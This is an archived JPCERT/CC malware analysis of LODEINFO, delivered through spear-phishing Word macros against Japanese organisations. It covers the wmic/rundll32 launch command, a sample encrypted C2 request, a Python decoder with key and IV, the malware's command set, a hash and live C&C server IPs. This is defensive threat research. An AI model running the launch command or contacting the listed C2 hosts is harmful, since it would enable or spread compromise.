{
    "id": "350656d6-3fa5-40eb-a993-e42c1db9c3eb",
    "created_at": "2023-01-12T15:02:20.831675Z",
    "updated_at": "2025-03-27T02:05:18.289666Z",
    "deleted_at": null,
    "sha1_hash": "6ce1ace9910aea88a3e6994e946069159adac58f",
    "title": "2020-02-27 - Malware “LODEINFO” Targeting Japan",
    "authors": "",
    "file_creation_date": "2022-12-29T00:32:53Z",
    "file_modification_date": "2022-12-29T00:32:53Z",
    "file_size": 584410,
    "plain_text": "# JPCERT Coordination Center official Blog\n\n**[blogs.jpcert.or.jp/en/2020/02/malware-lodeinfo-targeting-japan.html](https://blogs.jpcert.or.jp/en/2020/02/malware-lodeinfo-targeting-japan.html)**\n\n喜野 [孝太(Kota Kino)](https://blogs.jpcert.or.jp/en/kino/)\n\nFebruary 27, 2020\n\n## Malware “LODEINFO” Targeting Japan\n\n[LODEINFO](https://blogs.jpcert.or.jp/en/tags/lodeinfo/)\n\n[Email](mailto:?subject=Malware%20%E2%80%9CLODEINFO%E2%80%9D%20Targeting%20Japan&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fen%2F2020%2F02%2Fmalware-lodeinfo-targeting-japan.html)\n\nJPCERT/CC has been observing a new type of spear-phishing emails targeting Japanese\norganisations since December 2019.\n\nThe emails have a malicious Word file attachment leading to malware “LODEINFO”, which is\nnewly observed. This article introduces the details of this malware.\n\n### How LODEINFO is launched\n\nFigure 1 describes the flow of events from executing a Word file until LODEINFO is\nlaunched.\n\nFigure 1：Flow of events until LODEINFO runs\n\nBy enabling the macro, LODEINFO is created on the host and then executed by rundll32.exe\nwith the following command:\n\n\n-----\n\n```\nwmic process call create cmd /c cd %ProgramData%&start rundll32.exe [LODEINFO file\npath] main\"\n\n```\nAfter that, LODEINFO launches a svchost.exe process and inject the payload into the\nprocess.\nThen, it runs the payload as a thread.\n\nThe next section will explain the behaviour of LODEINFO after the injection.\n\n### Details of LODEINFO behaviour\n\nLODEINFO communicates with specific hosts and operates according to the commands\nreceived from there.\n\nThis is an example of HTTP POST request that LODEINFO sends.\n```\nPOST / HTTP/1.1\n\nContent-Type: application/x-www-form-urlencoded\n\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like\nGecko) Chrome/77.0.3865.90 Safari/537.36\n\nHost: [hostname]\n\nContent-Length: 193\n\nConnection: Keep-Alive\n\nCache-Control: no-cache\n\ndata=DIajqcc5lVuJpjwvr36msbQAAADitmc5LmhLlVituiM4OtDohYHRxBJ2R5yWjTYNyBTkUMGD2CPFpZw02\nRQPnYcQeRkqYNOyyRvfhAHSHAFDedFMJlyO1KztS1crvyayyYdL3zmNdE71MsWv2P5PeBzGU_v0EGa0VycSfNe\n\n\n```\nThe data is encrypted with AES and then BASE64-encoded. It contains information such as\nname, language environment and MAC address of the host running LODEINFO. Figure 2 is\nthe decoded data. (Please refer to Appendix A for the data format.)\n\nFigure 2: Part of decoded data\nThe following is a part of Python 3 code that decodes the HTTP POST request.\n\n\n-----\n\n```\nfrom Crypto.Cipher import AES\n\nfrom base64 import urlsafe_b64decode\n\nfrom binascii import a2b_hex\n\n\ndef decypt_lodeinfo_data(enc_data: str, key: bytes, iv: bytes) -> bytes:\n\n  header_b64 = enc_data[:0x1C]\n\n  header = urlsafe_b64decode(header_b64.replace(\".\", \"=\"))\n\n  ## decode with base64\n\n  postdata_size = int.from_bytes(header[0x10:0x14], byteorder=\"little\")\n\n  postdata_b64 = enc_data[0x1C:0x1C+postdata_size]\n\n  postdata = urlsafe_b64decode(postdata_b64.replace(\".\", \"=\"))\n\n  ## decrypt with AES\n\n  cipher = AES.new(key, AES.MODE_CBC, iv)\n\n  decrypt_size = int.from_bytes(postdata[0x30:0x34],byteorder=\"little\")\n\n  dec_data = cipher.decrypt(postdata[0x34:0x34+decrypt_size])\n\n  ## remove junk bytes\n\n  junk_size = dec_data[-1]\n\n  dec_data = dec_data[:decrypt_size-junk_size]\n\n  return dec_data\n\n\nencrypted_data =\n\"DIajqcc5lVuJpjwvr36msbQAAADitmc5LmhLlVituiM4OtDohYHRxBJ2R5yWjTYNyBTkUMGD2CPFpZw02cwPv\nRQPnYcQeRkqYNOyyRvfhAHSHAFDedFMJlyO1KztS1crvyayyYdL3zmNdE71MsWv2P5PeBzGU_v0EGa0VycSfNe\n\nKEY = a2b_hex(\"E20EF6C66A838DA222821DB1C5777251F1A9D5D14D2344CED68A353BFCAC4C5A\")\n\nIV = a2b_hex(\"CC45ABAD58152C6150F157367ECC53F3\")\n\ndecrypted_data = decypt_lodeinfo_data(encrypted_data, KEY,IV)\n\nprint(\"Decrypted Data: \", bytes.hex(decrypted_data))\n\n```\nNext, LODEINFO receives commands. The response from the C&C server is encrypted with\nAES and encoded with BASE64 as in the HTTP POST request. According to the commands\nsent from the C&C server, LODEINFO executes the following functions. (Please refer to\nAppendix B for command details.)\n\nExecute PE files\nExecute shellcode\nUpload/download files\nKill processes\nSend file list\nSend malware version\n\n### Code in LODEINFO\n\n\n-----\n\nIt was revealed that many parts of the code that appears in LODEINFO are similar to the\nsource code of LodePNG[1], a PNG file encoder/decoder shared on GitHub. However, it is\nnot uncertain why LODEINFO utilises the code as it does not seem to be using LodePNG’s\nfunction.\n\n### In closing\n\nIt seems that LODEINFO is under development as it contains a string “v0.1.2” as version\ninformation and some debug code in multiple sections. It is likely that the attack using this\nmalware continues.\n\nWe have hash values of samples similar to LODEINFO in Appendix C and a list of C&C\nservers in Appendix D. Please make sure that none of your devices is communicating with\nsuch hosts.\n\n- Kota Kino\n\n(Translated by Yukako Uchida)\n\n**Reference**\n\n[1] GitHub: LodePNG - PNG encoder and decoder in C and C++\n\n[https://github.com/lvandeve/lodepng](https://github.com/lvandeve/lodepng)\n\n**Appendix A Exchanged data**\n\nTable A-1: Data format (after BASE64 decoding)\n\n**Offset** **Length** **Contents**\n\n0x00 16 SHA512 value of AES key (first 16 bytes)\n\n0x10 4 Size of the BASE64-encoded data after 0x15\n\n0x14 1 Unknown\n\n0x15 48 SHA512 value of data before AES encryption (first 48 bytes)\n\n0x45 4 Size of AES-encrypted data\n\n0x49 variable AES-encrypted data\n\nTable A-2: Example of BASE64-decoded data\n\n\n-----\n\n**Appendix B Commands**\n\nTable B: Commands\n\n**Value** **Contents**\n\nMZ Execute PE files\n\n0xE9 Execute shellcode\n\ncd Change current directory\n\nls Send file list\n\nsend Download files\n\nrecv Upload files\n\ncat Upload files\n\nmemory Execute shellcode (inject into svchost.exe)\n\nkill Kill arbitrary process\n\nver Send malware version\n\n**Appendix C SHA-256 Hash Value of a sample**\n\nb50d83820a5704522fee59164d7bc69bea5c834ebd9be7fd8ad35b040910807f\n\n**Appendix D C&C servers**\n\n45.67.231.169\n162.244.32.148\n193.228.52.57\n\n\n-----\n\n[Email](mailto:?subject=Malware%20%E2%80%9CLODEINFO%E2%80%9D%20Targeting%20Japan&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fen%2F2020%2F02%2Fmalware-lodeinfo-targeting-japan.html)\n\nAuthor\n\n喜野 [孝太(Kota Kino)](https://blogs.jpcert.or.jp/en/kino/)\n\nKota Kino is Malware/Forensic Analyst at Incident Response Group, JPCERT/CC since\nAugust 2019.\n\nWas this page helpful?\n\n0 people found this content helpful.\n\nIf you wish to make comments or ask questions, please use this form.\n\nThis form is for comments and inquiries. For any questions regarding specific commercial\nproducts, please contact the vendor.\n\nplease change the setting of your browser to set JavaScript valid.\nThank you!\n\n## Related articles\n\nYamaBot Malware Used by Lazarus\n\nVSingle malware that obtains C2 server information from GitHub\n\n\n-----\n\nAnalysis of HUI Loader\n\nAnti-UPX Unpacking Technique\n\nFAQ: Malware that Targets Mobile Devices and How to Protect Them\n\n\n[Back](https://blogs.jpcert.or.jp/en/2020/02/japan-security-analyst-conference-2020-2.html)\n[Top](https://blogs.jpcert.or.jp/en/)\n[Next](https://blogs.jpcert.or.jp/en/2020/03/elf-tscookie.html)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-02-27 - Malware “LODEINFO” Targeting Japan.pdf"
    ],
    "report_names": [
        "2020-02-27 - Malware “LODEINFO” Targeting Japan.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535740,
    "ts_updated_at": 1743041118,
    "ts_creation_date": 1672273973,
    "ts_modification_date": 1672273973,
    "files": {
        "pdf": "https://archive.orkl.eu/6ce1ace9910aea88a3e6994e946069159adac58f.pdf",
        "text": "https://archive.orkl.eu/6ce1ace9910aea88a3e6994e946069159adac58f.txt",
        "img": "https://archive.orkl.eu/6ce1ace9910aea88a3e6994e946069159adac58f.jpg"
    }
}